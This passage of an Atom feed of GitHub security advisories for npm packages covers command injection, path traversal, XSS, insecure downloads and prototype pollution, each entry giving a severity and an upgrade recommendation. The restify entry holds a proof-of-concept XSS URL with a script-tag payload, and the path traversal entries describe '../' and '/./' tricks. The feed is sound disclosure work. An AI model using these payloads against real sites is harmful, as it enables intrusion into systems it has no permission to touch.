<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16106">https://nvd.nist.gov/vuln/detail/CVE-2017-16106</a></li>
<li><a href="https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/tmock">https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/tmock</a></li>
<li><a href="https://github.com/advisories/GHSA-j6w4-pg6p-5mrv">https://github.com/advisories/GHSA-j6w4-pg6p-5mrv</a></li>
<li><a href="https://www.npmjs.com/advisories/375">https://www.npmjs.com/advisories/375</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6w4-pg6p-5mrv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-07-23T23:51:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whereis] Command Injection in whereis]]></title>
        <id>https://github.com/advisories/GHSA-wjr4-2jgw-hmv8</id>
        <link href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8"/>
        <updated>2023-09-12T21:12:31.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>whereis</code> before 0.4.1 are vulnerable to command injection if untrusted user input is passed into <code>whereis</code>.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 0.4.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-3772">https://nvd.nist.gov/vuln/detail/CVE-2018-3772</a></li>
<li><a href="https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b">https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b</a></li>
<li><a href="https://hackerone.com/reports/319476">https://hackerone.com/reports/319476</a></li>
<li><a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">https://github.com/advisories/GHSA-wjr4-2jgw-hmv8</a></li>
<li><a href="https://www.npmjs.com/advisories/604">https://www.npmjs.com/advisories/604</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjr4-2jgw-hmv8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-07-31T18:28:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hostr] Directory Traversal in hostr]]></title>
        <id>https://github.com/advisories/GHSA-xqqr-p362-6rmc</id>
        <link href="https://github.com/advisories/GHSA-xqqr-p362-6rmc"/>
        <updated>2023-09-12T21:11:31.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>hostr</code> are vulnerable to directory traversal which allows attackers to read files outside the current directory by sending <code>../</code> in the url path for GET requests.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Upgrade to version 2.3.6 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16029">https://nvd.nist.gov/vuln/detail/CVE-2017-16029</a></li>
<li><a href="https://github.com/henrytseng/hostr/issues/8)">https://github.com/henrytseng/hostr/issues/8)</a></li>
<li><a href="https://github.com/advisories/GHSA-xqqr-p362-6rmc">https://github.com/advisories/GHSA-xqqr-p362-6rmc</a></li>
<li><a href="https://www.npmjs.com/advisories/303">https://www.npmjs.com/advisories/303</a></li>
<li><a href="https://github.com/henrytseng/hostr/issues/8">https://github.com/henrytseng/hostr/issues/8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqqr-p362-6rmc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-11-09T17:44:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitbook] Cross-Site Scripting in gitbook]]></title>
        <id>https://github.com/advisories/GHSA-5h5r-23r4-m87h</id>
        <link href="https://github.com/advisories/GHSA-5h5r-23r4-m87h"/>
        <updated>2023-09-12T21:10:50.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>gitbook</code> do not properly sanitize user input outside of backticks, which may result in cross-site scripting in the online reader.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 3.2.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitbookIO/gitbook/issues/1609">https://github.com/GitbookIO/gitbook/issues/1609</a></li>
<li><a href="https://www.npmjs.com/advisories/159">https://www.npmjs.com/advisories/159</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16019">https://nvd.nist.gov/vuln/detail/CVE-2017-16019</a></li>
<li><a href="https://github.com/advisories/GHSA-5h5r-23r4-m87h">https://github.com/advisories/GHSA-5h5r-23r4-m87h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h5r-23r4-m87h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-09-01T16:04:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[windows-selenium-chromedriver] windows-selenium-chromedriver downloads Resources over HTTP]]></title>
        <id>https://github.com/advisories/GHSA-j9q7-3rhf-4ppv</id>
        <link href="https://github.com/advisories/GHSA-j9q7-3rhf-4ppv"/>
        <updated>2023-09-12T21:10:15.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>windows-selenium-chromedriver</code> insecurely download an executable over an unencrypted HTTP connection. </p>
<p>In scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running <code>windows-selenium-chromedriver</code>.</p>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is currently available for this vulnerability.</p>
<p>The best mitigation is currently to avoid using this package, using a different package if available. </p>
<p>Alternatively, the risk of exploitation can be reduced by ensuring that this package is not installed while connected to a public network. If the package is installed on a private network, the only people who can exploit this vulnerability are those who have compromised your network or those who have privileged access to your ISP, such as Nation State Actors or Rogue ISP Employees.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.npmjs.com/advisories/285">https://www.npmjs.com/advisories/285</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-10687">https://nvd.nist.gov/vuln/detail/CVE-2016-10687</a></li>
<li><a href="https://github.com/advisories/GHSA-j9q7-3rhf-4ppv">https://github.com/advisories/GHSA-j9q7-3rhf-4ppv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j9q7-3rhf-4ppv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-09-01T16:11:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simplehttpserver] Path Traversal in simplehttpserver]]></title>
        <id>https://github.com/advisories/GHSA-vwr2-wj63-86gr</id>
        <link href="https://github.com/advisories/GHSA-vwr2-wj63-86gr"/>
        <updated>2023-09-12T21:07:30.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of <code>simplehttpserver</code> are vulnerable to Path Traversal. </p>
<p>This vulnerability allows an attacker to access files outside the webroot since it allows symlink navigation in the URL.</p>
<h2 id="recommendation">Recommendation</h2>
<p>No fix is currently available. Do not use <code>simplehttpserver</code> in production or consider using an alternative module until a fix is made available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16478">https://nvd.nist.gov/vuln/detail/CVE-2018-16478</a></li>
<li><a href="https://hackerone.com/reports/403703">https://hackerone.com/reports/403703</a></li>
<li><a href="https://github.com/advisories/GHSA-vwr2-wj63-86gr">https://github.com/advisories/GHSA-vwr2-wj63-86gr</a></li>
<li><a href="https://github.com/nodejs/security-wg/blob/master/vuln/npm/484.json">https://github.com/nodejs/security-wg/blob/master/vuln/npm/484.json</a></li>
<li><a href="https://www.npmjs.com/advisories/744">https://www.npmjs.com/advisories/744</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwr2-wj63-86gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2018-12-06T15:49:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[serve] Path Traversal in serve]]></title>
        <id>https://github.com/advisories/GHSA-v588-qcp3-jv46</id>
        <link href="https://github.com/advisories/GHSA-v588-qcp3-jv46"/>
        <updated>2023-09-12T21:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>serve</code> prior to 7.0.1 are vulnerable to Path Traversal. Explicitly ignored folders can be accessed through if the path contains a <code>/./</code>, which allows attackers to access hidden folders and files.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Upgrade to version 7.0.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5415">https://nvd.nist.gov/vuln/detail/CVE-2019-5415</a></li>
<li><a href="https://hackerone.com/reports/330724">https://hackerone.com/reports/330724</a></li>
<li><a href="https://github.com/advisories/GHSA-v588-qcp3-jv46">https://github.com/advisories/GHSA-v588-qcp3-jv46</a></li>
<li><a href="https://www.npmjs.com/advisories/1010">https://www.npmjs.com/advisories/1010</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v588-qcp3-jv46</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-03-25T18:03:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[restify] Cross-Site Scripting (XSS) in restify]]></title>
        <id>https://github.com/advisories/GHSA-qw3g-35hc-fcrh</id>
        <link href="https://github.com/advisories/GHSA-qw3g-35hc-fcrh"/>
        <updated>2023-09-12T21:05:44.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>restify</code> are susceptible to a cross-site scripting vulnerability when using URL encoded script tags in a non-existent URL.</p>
<h2 id="proof-of-concept">Proof of Concept:</h2>
<p>Request</p>
<pre><code>https://localhost:3000/no5_such3_file7.pl?%22%3E%3Cscript%3Ealert(73541);%3C/script%3E
</code></pre>
<p>Will be included in response:</p>
<p><code>&lt;script&gt;alert(73541);&lt;/script&gt;</code></p>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 4.1.0 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16018">https://nvd.nist.gov/vuln/detail/CVE-2017-16018</a></li>
<li><a href="https://github.com/restify/node-restify/issues/1018">https://github.com/restify/node-restify/issues/1018</a></li>
<li><a href="https://github.com/advisories/GHSA-qw3g-35hc-fcrh">https://github.com/advisories/GHSA-qw3g-35hc-fcrh</a></li>
<li><a href="https://www.npmjs.com/advisories/314">https://www.npmjs.com/advisories/314</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qw3g-35hc-fcrh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2018-11-09T17:45:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[defaults-deep] Prototype Pollution in defaults-deep]]></title>
        <id>https://github.com/advisories/GHSA-pjxw-22xf-6pwc</id>
        <link href="https://github.com/advisories/GHSA-pjxw-22xf-6pwc"/>
        <updated>2023-09-12T21:05:04.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of <code>defaults-deep</code> are vulnerable to prototype pollution. Provided certain input <code>defaults-deep</code> can add or modify properties of the <code>Object</code> prototype. These properties will be present on all objects.</p>
<h2 id="recommendation">Recommendation</h2>
<p>As no patch is currently available for this vulnerability it is our recommendation to select another module that can provide this functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16486">https://nvd.nist.gov/vuln/detail/CVE-2018-16486</a></li>
<li><a href="https://hackerone.com/reports/380878">https://hackerone.com/reports/380878</a></li>
<li><a href="https://github.com/advisories/GHSA-pjxw-22xf-6pwc">https://github.com/advisories/GHSA-pjxw-22xf-6pwc</a></li>
<li><a href="https://www.npmjs.com/advisories/778">https://www.npmjs.com/advisories/778</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pjxw-22xf-6pwc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2019-02-07T18:16:38.000Z</published>
    </entry>
</feed>